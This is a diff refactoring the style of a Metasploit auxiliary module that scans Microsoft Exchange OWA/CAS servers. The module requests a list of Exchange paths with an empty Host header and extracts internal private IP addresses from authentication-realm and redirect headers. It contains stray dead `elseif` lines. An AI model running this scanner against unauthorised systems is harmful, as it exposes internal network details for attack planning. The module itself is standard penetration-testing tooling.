@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,17 +7,16 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
 
- include Msf::Exploit::Remote::HttpClient
- include Msf::Auxiliary::Scanner
-
- def initialize
+  def initialize
     super(
       'Name'           => 'Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure',
-      'Description'    => %q{
+      'Description'    => %q(
         This module tests vulnerable IIS HTTP header file paths on Microsoft
         Exchange OWA 2003 and CAS 2007, 2010, and 2013 servers.
-      },
+      ),
       'Author'         =>
         [
           'Nate Power'
@@ -28,85 +28,84 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-   register_options(
-       [
+    register_options(
+      [
         OptInt.new('TIMEOUT', [ true, "HTTP connection timeout", 10]),
-        OptInt.new('RPORT', [ true, "The target port", 443]),
-       ], self.class)
-  end
+        OptInt.new('RPORT', [ true, "The target port", 443])
+      ], self.class
+    )
+   end
 
   def run_host(target_host)
-   rhost = target_host
-   print_status("#{msg} Checking HTTP headers")
-   get_ip_extract
+    rhost = target_host
+    print_status("#{msg} Checking HTTP headers")
+    get_ip_extract
   end
 
   def get_ip_extract
     urls = ["/Microsoft-Server-ActiveSync/default.eas",
-      "/Microsoft-Server-ActiveSync",
-      "/Autodiscover/Autodiscover.xml",
-      "/Autodiscover",
-      "/Exchange",
-      "/Rpc",
-      "/EWS/Exchange.asmx",
-      "/EWS/Services.wsdl",
-      "/EWS",
-      "/ecp",
-      "/OAB",
-      "/OWA",
-      "/aspnet_client",
-      "/PowerShell"]
+            "/Microsoft-Server-ActiveSync",
+            "/Autodiscover/Autodiscover.xml",
+            "/Autodiscover",
+            "/Exchange",
+            "/Rpc",
+            "/EWS/Exchange.asmx",
+            "/EWS/Services.wsdl",
+            "/EWS",
+            "/ecp",
+            "/OAB",
+            "/OWA",
+            "/aspnet_client",
+            "/PowerShell"]
 
     result = nil
 
     urls.each do |url|
       begin
         res = send_request_cgi({
-          'version' => "1.0",
-          'uri'      => "#{url}",
-          'method'   => 'GET',
-          'vhost'  =>  ''
-        }, timeout = datastore['TIMEOUT'])
+                                 'version' => "1.0",
+                                 'uri'      => url.to_s,
+                                 'method'   => 'GET',
+                                 'vhost' => ''
+                               }, timeout = datastore['TIMEOUT'])
 
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
         print_error("#{msg} HTTP Connection Failed")
         next
       end
 
-      if not res
+      unless res
         print_error("#{msg} HTTP Connection Timeout")
         next
       end
 
-      if res and res.code == 401 and (match = res['WWW-Authenticate'].match(/Basic realm=\"(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\"/i))
+      if res && (res.code == 401) && (match = res['WWW-Authenticate'].match(/Basic realm=\"(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\"/i))
         result = match.captures[0]
         print_status("#{msg} Status Code: 401 response")
-        print_status("#{msg} Found Path: " + url )
+        print_status("#{msg} Found Path: " + url)
         print_good("#{msg} Found target internal IP address: " + result)
         return result
-       elseif
+        elseif
         print_warning("#{msg} No internal address found")
         next
       end
 
-      if res and (res.code > 300 and res.code < 310) and (match = res['Location'].match(/^https?:\/\/(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\//i))
-        result = match.captures[0]
-        print_status("#{msg} Status Code: #{res.code} response")
-        print_status("#{msg} Found Path: " + url )
-        print_good("#{msg} Found target internal IP address: " + result)
-        return result
-       elseif
-        print_warning("#{msg} No internal address found")
-        next
-      end
+      next unless res && (res.code > 300 && res.code < 310) && (match = res['Location'].match(/^https?:\/\/(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\//i))
+      result = match.captures[0]
+      print_status("#{msg} Status Code: #{res.code} response")
+      print_status("#{msg} Found Path: " + url)
+      print_good("#{msg} Found target internal IP address: " + result)
+      return result
+      elseif
+      print_warning("#{msg} No internal address found")
+      next
     end
 
-    if result.nil?
-      print_warning("#{msg} Nothing found")
-    end
+    print_warning("#{msg} Nothing found") if result.nil?
 
-    return result
+    result
   end
+
   def msg
     "#{rhost}:#{rport} -"
   end
